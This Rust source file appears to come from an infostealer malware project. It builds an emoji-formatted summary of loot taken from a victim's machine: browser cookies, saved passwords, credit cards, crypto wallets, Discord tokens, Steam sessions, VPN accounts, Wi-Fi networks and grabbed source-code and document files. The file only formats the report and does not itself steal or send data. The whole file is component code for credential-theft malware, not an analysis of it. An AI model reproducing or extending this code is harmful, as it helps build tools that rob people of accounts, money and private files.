use crate::{Browser, Device, FileGrabber, Software, Vpn};
use crate::{Collector, format};
use alloc::borrow::Cow;
use alloc::sync::Arc;
use core::fmt::{Display, Formatter};
use derive_new::new;

macro_rules! collector_block {
    (
        $block_emoji:expr, $block_name:expr => [
            $( $field_emoji:expr, $field_name:expr => $field_value:expr ),* $(,)?
        ]
    ) => {{
        CollectorBlock::new(
            $block_emoji,
            $block_name,
            [
                $(
                    CollectorField::new(
                        $field_emoji,
                        $field_name,
                        format!("{}", $field_value),
                    )
                ),*
            ],
        )
    }};
}

#[derive(new)]
pub struct CollectorField<'a> {
    #[new(into)]
    pub emoji: &'static str,
    #[new(into)]
    pub name: &'a str,
    #[new(into)]
    pub value: Cow<'a, str>,
}

#[derive(new)]
pub struct CollectorBlock<'a> {
    #[new(into)]
    pub emoji: &'static str,
    #[new(into)]
    pub name: &'a str,
    #[new(into)]
    pub fields: Arc<[CollectorField<'a>]>,
}

pub struct EmojiBoolean(pub bool);

impl Display for EmojiBoolean {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        if self.0 {
            write!(f, "✅")
        } else {
            write!(f, "❌")
        }
    }
}

pub trait CollectorDisplay: Collector {
    fn display_blocks(&'_ self) -> Arc<[CollectorBlock<'_>]>;
}

impl<T: Collector> CollectorDisplay for T {
    fn display_blocks(&'_ self) -> Arc<[CollectorBlock<'_>]> {
        Arc::from([
            collector_block!(
                "🔍", "Browser Data" => [
                    "🍪", "Cookies" => self.get_browser().get_cookies(),
                    "🔐", "Passwords" => self.get_browser().get_passwords(),
                    "💳", "Credit Cards" => self.get_browser().get_credit_cards(),
                    "✍️", "Autofills" => self.get_browser().get_auto_fills(),
                    "🕘", "History" => self.get_browser().get_history(),
                    "📑", "Bookmarks" => self.get_browser().get_bookmarks(),
                    "⬇️", "Downloads" => self.get_browser().get_downloads(),
                ]
            ),
            collector_block!(
                "💻", "Installed Software" => [
                    "👛", "Wallets" => self.get_software().get_wallets(),
                    "📁", "FTP Hosts" => self.get_software().get_ftp_hosts(),
                    "📲", "Telegram" => EmojiBoolean(self.get_software().is_telegram()),
                    "🎮", "Discord Tokens" => self.get_software().get_discord_tokens(),
                    "🕹️", "Steam Sessions" => self.get_software().get_steam_session(),
                ]
            ),
            collector_block!(
                "📂", "User Files" => [
                    "🧑‍💻", "Source Code" => self.get_file_grabber().get_source_code_files(),
                    "🗃️", "Databases" => self.get_file_grabber().get_database_files(),
                    "📄", "Documents" => self.get_file_grabber().get_documents(),
                ]
            ),
            collector_block!(
            "🌐", "VPN" => [
                "🔐", "Accounts" => self.get_vpn().get_accounts(),
            ]),
            collector_block!(
                "📶", "Device Data" => [
                    "📡", "Wi-Fi Networks" => self.get_device().get_wifi_networks(),
                ]
            ),
        ])
    }
}

pub struct PrimitiveDisplayCollector<'a, T: Collector>(pub &'a T);

impl<T: Collector> Display for PrimitiveDisplayCollector<'_, T> {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        for block in self.0.display_blocks().iter() {
            writeln!(f, "▶ {}:", block.name)?;
            for (i, field) in block.fields.iter().enumerate() {
                let prefix = if i + 1 == block.fields.len() {
                    "└─"
                } else {
                    "├─"
                };
                writeln!(f, "{} {}: {}", prefix, field.name, field.value)?;
            }
        }

        Ok(())
    }
}
